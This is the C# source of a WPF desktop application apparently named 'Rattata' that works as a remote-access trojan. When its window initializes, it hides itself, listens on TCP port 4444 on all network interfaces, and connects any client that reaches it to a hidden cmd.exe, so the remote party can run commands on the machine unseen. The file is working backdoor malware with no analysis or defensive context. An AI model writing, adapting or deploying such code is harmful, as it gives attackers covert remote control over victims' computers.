using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Rattata.WPF
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private TcpListener? TcpListener { get; set; }
        private Socket? SocketForClient { get; set; }
        private NetworkStream? NetStream { get; set; }
        private StreamReader? StreamReader { get; set; }
        private StreamWriter? StreamWriter { get; set; }
        public Process? CmdPrompt { get; set; }

        public MainWindow()
        {
            InitializeComponent();
        }

        private void Grid_Initialized(object sender, EventArgs e)
        {
            this.Hide();
            TcpListener = new TcpListener(IPAddress.Any, 4444);
            TcpListener.Start();
            Debug.WriteLine("TCP Listener Started..");
            while (true) RunServer();
        }

        private void RunServer()
        {
            //SetupPS();
            SocketForClient = TcpListener.AcceptSocket();
            NetStream = new NetworkStream(SocketForClient);
            StreamReader = new StreamReader(NetStream);
            StreamWriter = new StreamWriter(NetStream);
            StreamWriter.AutoFlush = true;
            SetupCmd();

            try
            {
                using (StreamWriter isw = CmdPrompt.StandardInput)
                {
                    while (true)
                    {
                        string? line = StreamReader.ReadLine();
                        if (!CmdPrompt.HasExited)
                            isw.WriteLine(line);
                        else
                            throw new Exception();
                        Thread.Sleep(200);
                    }
                }
            }
            catch (Exception e)
            {
                CleanUp();
            }
        }

        private void SetupCmd()
        {
            CmdPrompt = new Process();
            ProcessStartInfo info = new ProcessStartInfo();
            info.FileName = "cmd.exe";
            info.RedirectStandardInput = true;
            info.RedirectStandardOutput = true;
            info.RedirectStandardError = true;
            info.UseShellExecute = false;
            info.WindowStyle = ProcessWindowStyle.Hidden;
            info.CreateNoWindow = true;
            

            CmdPrompt.StartInfo = info;
            CmdPrompt.Start();

            CmdPrompt.OutputDataReceived += CmdPrompt_OutputDataReceived;
            CmdPrompt.ErrorDataReceived += CmdPrompt_ErrorDataReceived;
            CmdPrompt.BeginOutputReadLine();
            CmdPrompt.BeginErrorReadLine();
        }

        private void CmdPrompt_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (StreamWriter.BaseStream.CanWrite)
                StreamWriter.WriteLine(e.Data);
        }

        private void CmdPrompt_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (StreamWriter.BaseStream.CanWrite)
                StreamWriter.WriteLine(e.Data);
        }

        private void CleanUp()
        {
            //StreamWriter.WriteLine("Exiting..");
            StreamWriter.Close();
            StreamReader.Close();
            NetStream.Close();
            SocketForClient.Close();
            CmdPrompt.WaitForExit();
        }
    }
}
